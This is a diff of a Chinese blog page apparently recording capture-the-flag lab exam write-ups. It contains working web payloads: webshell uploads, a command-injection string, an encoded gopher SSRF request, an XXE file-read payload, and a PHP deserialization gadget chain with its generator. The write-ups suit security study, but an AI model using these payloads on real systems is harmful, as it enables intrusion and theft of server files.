-<p><img src="/../assets/image_1734673202146_0.png" alt="image.png"></p>
-<p><code>flag&#123;40fef70e713fe9fc934667c18ca7a434&#125;</code></p>
-<blockquote>
-<p>我是好孩子我没改flag</p>
-</blockquote>
-<h2><span id="题目2">题目2</span></h2><p>没有提示，没有框，先扫一下</p>
-<p><img src="/../assets/image_1734673380819_0.png" alt="image.png"></p>
-<p>phpmyadmin，没有弱密码，登陆不进去</p>
-<p>有网站备份，下载下来看看</p>
-<p><img src="/../assets/image_1734673419179_0.png" alt="image.png"></p>
-<p>有好东西<code>index.php</code></p>
-<p><img src="/../assets/image_1734673515308_0.png" alt="image.png"></p>
-<p>有密码</p>
-<p><img src="/../assets/image_1734673486038_0.png" alt="image.png"></p>
-<p>phpmyadmin启动</p>
-<p><img src="/../assets/image_1734673628482_0.png" alt="image.png"></p>
-<p><code>flag&#123;88de7c430e8984299b0a0f850440b9e2&#125;</code></p>
-<blockquote>
-<p>我是好孩子我没改flag</p>
-</blockquote>
-<h2><span id="题目3">题目3</span></h2><p>看了看f12</p>
-<p><img src="/../assets/image_1734673703486_0.png" alt="image.png"></p>
-<p>让俺信息收集，那就来吧，直接开扫</p>
-<p><img src="/../assets/image_1734673881532_0.png" alt="image.png"></p>
-<p>这upload页面还藏起来了，直接传马，啥校验也没有，直接干</p>
-<p><img src="/../assets/image_1734674066120_0.png" alt="image.png"></p>
-<p>连webshell</p>
-<p><img src="/../assets/image_1734674019652_0.png" alt="image.png"></p>
-<p>让我康康</p>
-<p><img src="/../assets/image_1734674092799_0.png" alt="image.png"></p>
-<p><code>flag&#123;174344ef316b9d58b6917ca468b7e04c&#125;</code></p>
-<blockquote>
-<p>我是好孩子我没改flag</p>
-</blockquote>
-<h2><span id="题目4">题目4</span></h2><p>小手一抖登陆进去了，有sql注入，开始梭哈</p>
-<p><img src="/../assets/image_1734674370233_0.png" alt="image.png"></p>
-<p>timu4</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: 192.168.2.214:10003</span><br><span class="line">Content-Length: 41</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Origin: http://192.168.2.214:10003</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.86 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Referer: http://192.168.2.214:10003/</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Cookie: PHPSESSID=f29dcd6a3675ac3e9cd11d88a3550bed</span><br><span class="line">Connection: keep-alive</span><br><span class="line">username=admin&amp;password=123</span><br></pre></td></tr></table></figure>
+        <h2><span id="题目1">题目1</span></h2><p>上传webshell</p>
+<p><img src="/../assets/image_1736487149418_0.png" alt="image.png"></p>
+<p>蚁剑连接，发现了小黑子</p>
+<p><img src="/../assets/image_1736487136674_0.png" alt="image.png"></p>
+<p>告诉俺flag不再这里，难不成你还有内网机器？</p>
+<p>看看&#x2F;etc&#x2F;hosts</p>
+<p><img src="/../assets/image_1736487249554_0.png" alt="image.png"></p>
+<p>开始爆破</p>
+<p><img src="/../assets/image_1736487402651_0.png" alt="image.png"></p>
+<p>emmm直接就是各命令执行，开整</p>
+<p><img src="/../assets/image_1736489279433_0.png" alt="image.png"></p>
+<p>payload</p>
+<p>命令执行</p>
+<p><code>cmd=id&amp;cat flag.php</code></p>
+<p>ssrf</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url=gopher%3A%2F%2F192.168.9.11%3A80%2F_%25%35%30%25%34%66%25%35%33%25%35%34%25%32%30%25%32%66%25%32%30%25%34%38%25%35%34%25%35%34%25%35%30%25%32%66%25%33%31%25%32%65%25%33%31%25%30%64%25%30%61%25%34%38%25%36%66%25%37%33%25%37%34%25%33%61%25%32%30%25%33%31%25%33%39%25%33%32%25%32%65%25%33%31%25%33%36%25%33%38%25%32%65%25%33%39%25%32%65%25%33%31%25%33%31%25%33%61%25%33%38%25%33%30%25%30%64%25%30%61%25%34%33%25%36%66%25%36%65%25%37%34%25%36%35%25%36%65%25%37%34%25%32%64%25%34%63%25%36%35%25%36%65%25%36%37%25%37%34%25%36%38%25%33%61%25%32%30%25%33%32%25%33%31%25%30%64%25%30%61%25%34%33%25%36%31%25%36%33%25%36%38%25%36%35%25%32%64%25%34%33%25%36%66%25%36%65%25%37%34%25%37%32%25%36%66%25%36%63%25%33%61%25%32%30%25%36%64%25%36%31%25%37%38%25%32%64%25%36%31%25%36%37%25%36%35%25%33%64%25%33%30%25%30%64%25%30%61%25%34%31%25%36%33%25%36%33%25%36%35%25%37%30%25%37%34%25%32%64%25%34%63%25%36%31%25%36%65%25%36%37%25%37%35%25%36%31%25%36%37%25%36%35%25%33%61%25%32%30%25%37%61%25%36%38%25%32%64%25%34%33%25%34%65%25%32%63%25%37%61%25%36%38%25%33%62%25%37%31%25%33%64%25%33%30%25%32%65%25%33%39%25%30%64%25%30%61%25%34%66%25%37%32%25%36%39%25%36%37%25%36%39%25%36%65%25%33%61%25%32%30%25%36%38%25%37%34%25%37%34%25%37%30%25%33%61%25%32%66%25%32%66%25%33%38%25%32%65%25%33%31%25%33%34%25%33%30%25%32%65%25%33%32%25%33%32%25%33%39%25%32%65%25%33%31%25%33%32%25%33%61%25%33%31%25%33%30%25%33%30%25%33%30%25%33%30%25%30%64%25%30%61%25%34%33%25%36%66%25%36%65%25%37%34%25%36%35%25%36%65%25%37%34%25%32%64%25%35%34%25%37%39%25%37%30%25%36%35%25%33%61%25%32%30%25%36%31%25%37%30%25%37%30%25%36%63%25%36%39%25%36%33%25%36%31%25%37%34%25%36%39%25%36%66%25%36%65%25%32%66%25%37%38%25%32%64%25%37%37%25%37%37%25%37%37%25%32%64%25%36%36%25%36%66%25%37%32%25%36%64%25%32%64%25%37%35%25%37%32%25%36%63%25%36%35%25%36%65%25%36%33%25%36%66%25%36%34%25%36%35%25%36%34%25%30%64%25%30%61%25%35%35%25%37%30%25%36%37%25%37%32%25%36%31%25%36%34%25%36%35%25%32%64%25%34%39%25%36%65%25%37%33%25%36%35%25%36%33%25%37%35%25%37%32%25%36%35%25%32%64%25%35%32%25%36%35%25%37%31%25%37%35%25%36%35%25%37%33%25%37%34%25%37%33%25%33%61%25%32%30%25%33%31%25%30%64%25%30%61%25%35%35%25%37%33%25%36%35%25%37%32%25%32%64%25%34%31%25%36%37%25%36%35%25%36%65%25%37%34%25%33%61%25%32%30%25%34%64%25%36%66%25%37%61%25%36%39%25%36%63%25%36%63%25%36%31%25%32%66%25%33%35%25%32%65%25%33%30%25%32%30%25%32%38%25%35%37%25%36%39%25%36%65%25%36%34%25%36%66%25%37%37%25%37%33%25%32%30%25%34%65%25%35%34%25%32%30%25%33%31%25%33%30%25%32%65%25%33%30%25%33%62%25%32%30%25%35%37%25%36%39%25%36%65%25%33%36%25%33%34%25%33%62%25%32%30%25%37%38%25%33%36%25%33%34%25%32%39%25%32%30%25%34%31%25%37%30%25%37%30%25%36%63%25%36%35%25%35%37%25%36%35%25%36%32%25%34%62%25%36%39%25%37%34%25%32%66%25%33%35%25%33%33%25%33%37%25%32%65%25%33%33%25%33%36%25%32%30%25%32%38%25%34%62%25%34%38%25%35%34%25%34%64%25%34%63%25%32%63%25%32%30%25%36%63%25%36%39%25%36%62%25%36%35%25%32%30%25%34%37%25%36%35%25%36%33%25%36%62%25%36%66%25%32%39%25%32%30%25%34%33%25%36%38%25%37%32%25%36%66%25%36%64%25%36%35%25%32%66%25%33%31%25%33%33%25%33%31%25%32%65%25%33%30%25%32%65%25%33%36%25%33%37%25%33%37%25%33%38%25%32%65%25%33%38%25%33%36%25%32%30%25%35%33%25%36%31%25%36%36%25%36%31%25%37%32%25%36%39%25%32%66%25%33%35%25%33%33%25%33%37%25%32%65%25%33%33%25%33%36%25%30%64%25%30%61%25%34%31%25%36%33%25%36%33%25%36%35%25%37%30%25%37%34%25%33%61%25%32%30%25%37%34%25%36%35%25%37%38%25%37%34%25%32%66%25%36%38%25%37%34%25%36%64%25%36%63%25%32%63%25%36%31%25%37%30%25%37%30%25%36%63%25%36%39%25%36%33%25%36%31%25%37%34%25%36%39%25%36%66%25%36%65%25%32%66%25%37%38%25%36%38%25%37%34%25%36%64%25%36%63%25%32%62%25%37%38%25%36%64%25%36%63%25%32%63%25%36%31%25%37%30%25%37%30%25%36%63%25%36%39%25%36%33%25%36%31%25%37%34%25%36%39%25%36%66%25%36%65%25%32%66%25%37%38%25%36%64%25%36%63%25%33%62%25%37%31%25%33%64%25%33%30%25%32%65%25%33%39%25%32%63%25%36%39%25%36%64%25%36%31%25%36%37%25%36%35%25%32%66%25%36%31%25%37%36%25%36%39%25%36%36%25%32%63%25%36%39%25%36%64%25%36%31%25%36%37%25%36%35%25%32%66%25%37%37%25%36%35%25%36%32%25%37%30%25%32%63%25%36%39%25%36%64%25%36%31%25%36%37%25%36%35%25%32%66%25%36%31%25%37%30%25%36%65%25%36%37%25%32%63%25%32%61%25%32%66%25%32%61%25%33%62%25%37%31%25%33%64%25%33%30%25%32%65%25%33%38%25%32%63%25%36%31%25%37%30%25%37%30%25%36%63%25%36%39%25%36%33%25%36%31%25%37%34%25%36%39%25%36%66%25%36%65%25%32%66%25%37%33%25%36%39%25%36%37%25%36%65%25%36%35%25%36%34%25%32%64%25%36%35%25%37%38%25%36%33%25%36%38%25%36%31%25%36%65%25%36%37%25%36%35%25%33%62%25%37%36%25%33%64%25%36%32%25%33%33%25%33%62%25%37%31%25%33%64%25%33%30%25%32%65%25%33%37%25%30%64%25%30%61%25%35%32%25%36%35%25%36%36%25%36%35%25%37%32%25%36%35%25%37%32%25%33%61%25%32%30%25%36%38%25%37%34%25%37%34%25%37%30%25%33%61%25%32%66%25%32%66%25%33%38%25%32%65%25%33%31%25%33%34%25%33%30%25%32%65%25%33%32%25%33%32%25%33%39%25%32%65%25%33%31%25%33%32%25%33%61%25%33%31%25%33%30%25%33%30%25%33%30%25%33%30%25%32%66%25%37%36%25%37%35%25%36%63%25%36%65%25%35%66%25%36%39%25%36%62%25%37%35%25%36%65%25%32%65%25%37%30%25%36%38%25%37%30%25%33%66%25%37%35%25%37%32%25%36%63%25%33%64%25%36%38%25%37%34%25%37%34%25%37%30%25%33%61%25%32%66%25%32%66%25%33%31%25%33%39%25%33%32%25%32%65%25%33%31%25%33%36%25%33%38%25%32%65%25%33%39%25%32%65%25%33%31%25%33%31%25%30%64%25%30%61%25%34%31%25%36%33%25%36%33%25%36%35%25%37%30%25%37%34%25%32%64%25%34%35%25%36%65%25%36%33%25%36%66%25%36%34%25%36%39%25%36%65%25%36%37%25%33%61%25%32%30%25%36%34%25%36%35%25%36%36%25%36%63%25%36%31%25%37%34%25%36%35%25%32%63%25%32%30%25%36%32%25%37%32%25%30%64%25%30%61%25%34%33%25%36%66%25%36%65%25%36%65%25%36%35%25%36%33%25%37%34%25%36%39%25%36%66%25%36%65%25%33%61%25%32%30%25%36%62%25%36%35%25%36%35%25%37%30%25%32%64%25%36%31%25%36%63%25%36%39%25%37%36%25%36%35%25%30%64%25%30%61%25%30%64%25%30%61%25%36%33%25%36%64%25%36%34%25%33%64%25%36%39%25%36%34%25%32%35%25%33%32%25%33%36%25%36%33%25%36%31%25%37%34%25%32%62%25%36%36%25%36%63%25%36%31%25%36%37%25%32%65%25%37%30%25%36%38%25%37%30</span><br></pre></td></tr></table></figure>
 
-<p><code>--os-shell</code>一把梭</p>
-<p><img src="/../assets/image_1734674746011_0.png" alt="image.png"></p>
-<p>获取flag</p>
-<p><img src="/../assets/image_1734674684673_0.png" alt="image.png"></p>
-<p><code>flag&#123;8caecc0d7209b1e97c8c0b0c6891992c&#125;</code></p>
-<blockquote>
-<p>我是好孩子我没改flag</p>
-</blockquote>
+<p><code>flag&#123;4104d0bdc968e8709b51f71cb3c755790e15e4df&#125;</code></p>
+<h2><span id="题目2">题目2</span></h2><p>密码123456登陆成功</p>
+<p>看起来好像有sql注入？？不管了，梭哈</p>
+<p><img src="/../assets/image_1736490053866_0.png" alt="image.png"></p>
+<p><img src="/../assets/image_1736490037642_0.png" alt="image.png"></p>
+<p>timu2</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">POST /get_students.php HTTP/1.1</span><br><span class="line">Host: 8.140.229.12:10001</span><br><span class="line">Content-Length: 30</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.86 Safari/537.36</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Accept: */*</span><br><span class="line">Origin: http://8.140.229.12:10001</span><br><span class="line">Referer: http://8.140.229.12:10001/students.php</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Cookie: PHPSESSID=df31b1421a4fd4fff8f4b519d8afcd5f</span><br><span class="line">Connection: keep-alive</span><br><span class="line">&#123;&quot;id&quot;:&quot;&quot;,&quot;name&quot;:&quot;&quot;,&quot;grade&quot;:&quot;&quot;&#125;</span><br></pre></td></tr></table></figure>
+
+<p><code>flag&#123;5e5326c0a2d2b4ce3e481f8bdd7f0da6&#125;</code></p>
+<h2><span id="题目3">题目3</span></h2><p>扫描路径</p>
+<p><img src="/../assets/image_1736491108763_0.png" alt="image.png"></p>
+<p>没啥东西啊，登陆一下看看。有万能密码，但是很奇怪，没有任何跳转。</p>
+<p>发现登陆接口是这个样子的，一眼xxe</p>
+<p><img src="/../assets/image_1736490505216_0.png" alt="image.png"></p>
+<p>回显位在uuid上。尝试包含<code>/etc/passwd</code>成功</p>
+<p>包含<code>flag.php</code>报错，但是扫到该文件了。尝试使用伪协议进base64编码</p>
+<p>payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE root [&lt;!ENTITY test SYSTEM &#x27;php://filter/convert.base64-encode/resource=/var/www/html/flag.php&#x27;&gt;]&gt;&lt;login&gt;&lt;user&gt;admin&#x27;or 1=1#&lt;/user&gt;&lt;pass&gt;123213&lt;/pass&gt;&lt;uuid&gt;&amp;test;&lt;/uuid&gt;&lt;/login&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../assets/image_1736491198198_0.png" alt="image.png"></p>
+<p><code>flag&#123;550c41a03d1646a97b7a68e6718e94ab&#125;</code></p>
+<h2><span id="题目4">题目4</span></h2><p>存在文件包含，尝试查看源码</p>
+<p>index.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">&quot;en&quot;</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;UTF-8&quot;</span>&gt;</span><br><span class="line">    &lt;meta name=<span class="string">&quot;viewport&quot;</span> content=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span><br><span class="line">    &lt;title&gt;首页&lt;/title&gt;</span><br><span class="line">    &lt;style&gt;</span><br><span class="line">        body &#123;</span><br><span class="line">            font-family: Arial, sans-serif;</span><br><span class="line">            margin: <span class="number">0</span>;</span><br><span class="line">            padding: <span class="number">0</span>;</span><br><span class="line">            background-color: <span class="comment">#f9f9f9;</span></span><br><span class="line">            color: <span class="comment">#333;</span></span><br><span class="line">        &#125;</span><br><span class="line">        header &#123;</span><br><span class="line">            background-color: <span class="comment">#0078D7;</span></span><br><span class="line">            color: white;</span><br><span class="line">            padding: <span class="number">20</span>px;</span><br><span class="line">            text-align: center;</span><br><span class="line">            box-shadow: <span class="number">0</span> <span class="number">4</span>px <span class="number">8</span>px <span class="title function_ invoke__">rgba</span>(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0.1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        nav &#123;</span><br><span class="line">            margin: <span class="number">20</span>px auto;</span><br><span class="line">            text-align: center;</span><br><span class="line">        &#125;</span><br><span class="line">        nav a &#123;</span><br><span class="line">            display: inline-block;</span><br><span class="line">            margin: <span class="number">10</span>px <span class="number">20</span>px;</span><br><span class="line">            padding: <span class="number">10</span>px <span class="number">20</span>px;</span><br><span class="line">            text-decoration: none;</span><br><span class="line">            color: <span class="comment">#0078D7;</span></span><br><span class="line">            border: <span class="number">2</span>px solid <span class="comment">#0078D7;</span></span><br><span class="line">            border-radius: <span class="number">5</span>px;</span><br><span class="line">            font-weight: bold;</span><br><span class="line">            transition: all <span class="number">0.3</span>s;</span><br><span class="line">        &#125;</span><br><span class="line">        nav a:hover &#123;</span><br><span class="line">            background-color: <span class="comment">#0078D7;</span></span><br><span class="line">            color: white;</span><br><span class="line">        &#125;</span><br><span class="line">        footer &#123;</span><br><span class="line">            text-align: center;</span><br><span class="line">            padding: <span class="number">10</span>px <span class="number">20</span>px;</span><br><span class="line">            background-color: <span class="comment">#f1f1f1;</span></span><br><span class="line">            border-top: <span class="number">1</span>px solid <span class="comment">#ddd;</span></span><br><span class="line">            margin-top: <span class="number">20</span>px;</span><br><span class="line">        &#125;</span><br><span class="line">    &lt;/style&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;header&gt;</span><br><span class="line">    &lt;h1&gt;欢迎来到首页&lt;/h1&gt;</span><br><span class="line">&lt;/header&gt;</span><br><span class="line">&lt;nav&gt;</span><br><span class="line">    &lt;a href=<span class="string">&quot;index.php&quot;</span>&gt;首页&lt;/a&gt;</span><br><span class="line">    &lt;a href=<span class="string">&quot;index.php?file=test.php&quot;</span>&gt;猜猜这是什么 - Page <span class="number">1</span>&lt;/a&gt;</span><br><span class="line">    &lt;a href=<span class="string">&quot;index.php?file=class.php&quot;</span>&gt;猜猜这是什么 - Page <span class="number">2</span>&lt;/a&gt;</span><br><span class="line">    &lt;a href=<span class="string">&quot;index.php?file=flag.php&quot;</span>&gt;Flag&lt;/a&gt;</span><br><span class="line">&lt;/nav&gt;</span><br><span class="line">&lt;footer&gt;</span><br><span class="line">    &amp;copy; <span class="number">2025</span> cybersecurity</span><br><span class="line">&lt;/footer&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/flag/&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">            <span class="keyword">exit</span>(<span class="string">&quot;hacker~&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">include</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>class.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Main</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ClassObj</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;ClassObj = <span class="keyword">new</span> <span class="title class_">Test3</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;ClassObj-&gt;<span class="title function_ invoke__">action</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Output</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">action</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;hello chaitin&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test3</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$data</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span> = <span class="string">&quot;phpinfo();&quot;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">action</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;data);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">info</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        @<span class="keyword">eval</span>(<span class="variable language_">$this</span> -&gt; str);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>test.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;flag在flag.php&quot;</span>;</span><br><span class="line">    <span class="keyword">require</span> <span class="string">&quot;class.php&quot;</span>;</span><br><span class="line">    @<span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;nb&#x27;</span>]);</span><br></pre></td></tr></table></figure>
+
+<p>一眼反序列化，尝试包含<code>/etc/passwd</code></p>
+<p><img src="/../assets/image_1736491514721_0.png" alt="image.png"></p>
+<p>index.php中的过滤好像并管不到nb这个参数，我们直接包含flag.php</p>
+<p>生产payload</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Main</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ClassObj</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;ClassObj = <span class="keyword">new</span> <span class="title class_">Test3</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test3</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$data</span>;</span><br><span class="line">		<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">			<span class="variable language_">$this</span>-&gt;data = <span class="string">&quot;/var/www/html/index.php&quot;</span>;</span><br><span class="line">		&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$m</span> = <span class="keyword">new</span> <span class="title class_">Main</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$m</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=test.php&amp;nb=O:4:&quot;Main&quot;:1:&#123;s:8:&quot;ClassObj&quot;;O:5:&quot;Test3&quot;:1:&#123;s:4:&quot;data&quot;;s:22:&quot;/var/www/html/flag.php&quot;;&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../assets/image_1736491667361_0.png" alt="image.png"></p>
+<p><code>flag&#123;92d5c6f8df9f7f5a711157446fbc1915&#125;</code></p>
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2024/12/20/week6_kls_exam/" data-id="cm5vste5h002vfriwgrw28ttz" data-title="week6_kls_exam" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2025/01/10/week9_kls_exam/" data-id="cm6z08or8003sy1iw3jdt5jtb" data-title="week9_kls_exam" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -371,12 +504,16 @@
 
 
   
-    <article id="post-day29_kls" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+    <article id="post-week8_kls_exam" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
-    <a href="/2024/12/20/day29_kls/" class="article-date">
-  <time class="dt-published" datetime="2024-12-19T16:28:30.000Z" itemprop="datePublished">2024-12-20</time>
+    <a href="/2025/01/03/week8_kls_exam/" class="article-date">
+  <time class="dt-published" datetime="2025-01-03T08:01:39.000Z" itemprop="datePublished">2025-01-03</time>
 </a>
     
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/exam/">exam</a>
+  </div>
+
   </div>
   <div class="article-inner">
     
@@ -385,7 +522,7 @@
         
   
     <h1 itemprop="name">
-      <a class="p-name article-title" href="/2024/12/20/day29_kls/">day29_kls</a>
+      <a class="p-name article-title" href="/2025/01/03/week8_kls_exam/">week8_kls_exam</a>
     </h1>
   
 
@@ -393,54 +530,45 @@
     
     <div class="e-content article-entry" itemprop="articleBody">
       
-        <h2><span id="课程内容">课程内容</span></h2><h3><span id="文件上传">文件上传</span></h3><p>原因</p>
-<p>后端未做严格校验，导致用户上传恶意文件</p>
-<p>危害</p>
-<p>控制站点</p>
-<p>资源耗尽</p>
-<p>挖掘</p>
-<p>传就完事啦</p>
-<p>利用</p>
-<p>上传webshell</p>
-<p>防御</p>
-<p>白名单</p>
-<p>使用oss存储</p>
-<p>存储与站点分离</p>
-<p>绕过防御</p>
-<p>php</p>
-<p>使用其他后缀</p>
